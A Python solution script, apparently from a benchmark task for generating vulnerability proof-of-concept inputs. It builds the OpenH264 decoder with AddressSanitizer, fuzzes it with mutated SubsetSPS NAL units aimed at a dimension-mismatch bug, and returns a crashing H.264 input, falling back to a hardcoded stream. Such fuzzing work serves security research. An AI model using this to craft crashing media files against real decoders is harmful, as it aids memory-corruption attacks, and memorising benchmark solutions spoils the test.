import os
import sys
import tarfile
import subprocess
import shutil
import glob
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a unique work directory
        work_dir = os.path.abspath(f"work_{random.randint(0, 1000000)}")
        if os.path.exists(work_dir):
            shutil.rmtree(work_dir)
        os.makedirs(work_dir)

        try:
            # 1. Extract the source code
            with tarfile.open(src_path) as tar:
                tar.extractall(work_dir)
            
            # 2. Locate the root directory containing the Makefile
            root_dir = work_dir
            for root, dirs, files in os.walk(work_dir):
                if "Makefile" in files:
                    # OpenH264 specific heuristic: check for codec/console folders
                    if "codec" in dirs or "test" in dirs or "build" in dirs:
                        root_dir = root
                        break
            
            # 3. Build the vulnerable decoder with AddressSanitizer (ASAN)
            env = os.environ.copy()
            flags = "-fsanitize=address -g"
            env["CFLAGS"] = flags
            env["CXXFLAGS"] = flags
            env["LDFLAGS"] = flags
            
            # Build command for OpenH264 console decoder
            # We disable ASM to avoid nasm dependency issues in some envs
            cmd = [
                "make", "-j8",
                "OS=linux", "ARCH=x86_64",
                "USE_ASM=No", "BUILDTYPE=Debug",
                "h264dec"
            ]
            
            subprocess.run(
                cmd, 
                cwd=root_dir, 
                env=env, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL,
                timeout=300 # 5 minutes build timeout
            )
            
            # 4. Locate the compiled binary
            binary_path = None
            possible_locs = [
                os.path.join(root_dir, "h264dec"),
                os.path.join(root_dir, "codec", "build", "linux", "dec", "h264dec"),
                os.path.join(root_dir, "codec", "console", "dec", "h264dec")
            ]
            for p in possible_locs:
                if os.path.exists(p):
                    binary_path = p
                    break
            
            if not binary_path:
                found = glob.glob(os.path.join(root_dir, "**", "h264dec"), recursive=True)
                if found:
                    binary_path = found[0]
            
            if not binary_path or not os.access(binary_path, os.X_OK):
                return self.fallback_payload()

            # 5. Prepare Seeds
            seeds = []
            raw_seeds = glob.glob(os.path.join(root_dir, "**", "*.264"), recursive=True)
            for s in raw_seeds:
                try:
                    with open(s, "rb") as f:
                        data = f.read()
                        if 10 < len(data) < 100000: 
                            seeds.append(data)
                except:
                    pass
            
            if not seeds:
                seeds.append(self.fallback_payload())

            # 6. Fuzzing Loop
            # The vulnerability involves mismatch between decoder display dimensions 
            # and subset sequence dimensions (SVC). 
            # We fuzz by injecting SubsetSPS (NAL 15) derived from SPS (NAL 7)
            # and corrupting the dimensions.
            
            start_time = time.time()
            iters = 0
            
            # Fuzz for up to 60 seconds
            while time.time() - start_time < 60:
                base = random.choice(seeds)
                candidate = self.mutate(base)
                
                tmp_poc = os.path.join(work_dir, f"poc_{iters}.264")
                with open(tmp_poc, "wb") as f:
                    f.write(candidate)
                
                try:
                    # Run the decoder: ./h264dec input.264 /dev/null
                    proc = subprocess.run(
                        [binary_path, tmp_poc, "/dev/null"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        timeout=1
                    )
                    
                    if proc.returncode != 0:
                        err_out = proc.stderr.decode(errors='ignore')
                        # Check for ASAN crash or Segfault
                        if "AddressSanitizer" in err_out or "heap-buffer-overflow" in err_out:
                            return candidate
                        if proc.returncode == -11 or proc.returncode == 139:
                            return candidate
                            
                except subprocess.TimeoutExpired:
                    pass
                finally:
                    if os.path.exists(tmp_poc):
                        os.remove(tmp_poc)
                
                iters += 1
            
            # If no crash found, return the fallback
            return self.fallback_payload()

        except Exception:
            return self.fallback_payload()
        finally:
            if os.path.exists(work_dir):
                shutil.rmtree(work_dir)

    def mutate(self, data: bytes) -> bytes:
        # NAL unit parsing and injection strategy
        nals = []
        cursor = 0
        while True:
            # Find next start code 00 00 00 01
            next_cursor = data.find(b'\x00\x00\x00\x01', cursor + 3)
            if next_cursor == -1:
                nals.append(data[cursor:])
                break
            nals.append(data[cursor:next_cursor])
            cursor = next_cursor
            
        new_nals = []
        for nal in nals:
            new_nals.append(nal)
            # Check for SPS (NAL unit type 7)
            # Start code is 4 bytes, header is at index 4
            if len(nal) > 5 and (nal[4] & 0x1F) == 7:
                # Inject a mutated SubsetSPS (NAL unit type 15)
                subset = bytearray(nal)
                # Change NAL header: RefIdc=3, Type=15 -> 011 01111 -> 0x6F
                subset[4] = 0x6F
                
                # Fuzz the payload (Exp-Golomb parameters)
                # Corrupt bytes 5 to 40 to likely hit dimensions/SPS ID
                fuzz_len = min(len(subset), 40)
                for i in range(5, fuzz_len):
                    if random.random() < 0.3:
                        subset[i] = random.randint(0, 255)
                
                new_nals.append(bytes(subset))
        
        result = b''.join(new_nals)
        
        # General bit flips
        if random.random() < 0.5:
            arr = bytearray(result)
            count = random.randint(1, 5)
            for _ in range(count):
                idx = random.randint(0, len(arr)-1)
                arr[idx] ^= (1 << random.randint(0, 7))
            result = bytes(arr)
            
        return result

    def fallback_payload(self) -> bytes:
        # Minimal valid H.264 stream with SVC extension hint
        return (
            b'\x00\x00\x00\x01\x67\x42\x00\x1e\x95\xa0\x14\x01\x6e\x40' # SPS
            b'\x00\x00\x00\x01\x6f\x42\x00\x1e\x95\xa0\x28\x02\xdd\x80' # SubsetSPS (synthetic)
            b'\x00\x00\x00\x01\x68\xce\x3c\x80'                         # PPS
            b'\x00\x00\x00\x01\x65\xb8\x00\x00\x00\x00'                 # IDR Slice
        )